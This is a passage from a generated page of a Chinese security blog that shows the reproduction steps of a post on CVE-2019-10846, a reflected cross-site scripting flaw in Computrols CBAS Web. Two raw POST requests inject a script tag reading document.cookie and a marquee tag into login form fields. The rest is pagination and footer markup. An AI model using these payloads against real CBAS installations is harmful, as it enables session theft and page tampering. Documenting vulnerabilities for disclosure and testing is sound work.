+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h3><pre><code>POST /cbas/index.php?m=auth&amp;a=verifyid HTTP/1.1
+
+username=&quot;&gt;&lt;script&gt;confirm(document.cookie)&lt;/script&gt;&amp;submit_button=Send+Me+a+New+Password+Via+Email
+</code></pre>
+<h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><pre><code>POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1
+
+username=&quot;&gt;&lt;marquee&gt;htmlinjection&lt;/marquee&gt;&amp;password=&amp;challenge=60753c1b5e449de80e21472b5911594d&amp;response=e16371917371b8b70529737813840c62
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10846%EF%BC%89Computrols%20CBAS%20Web%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Computrols%20CBAS%20Web/%EF%BC%88CVE-2019-10846%EF%BC%89Computrols%20CBAS%20Web%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qndx003vy8v149917jxy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/86/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/85/">85</a><a class="page-number" href="/page/86/">86</a><span class="page-number current">87</span><a class="page-number" href="/page/88/">88</a><a class="page-number" href="/page/89/">89</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/88/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
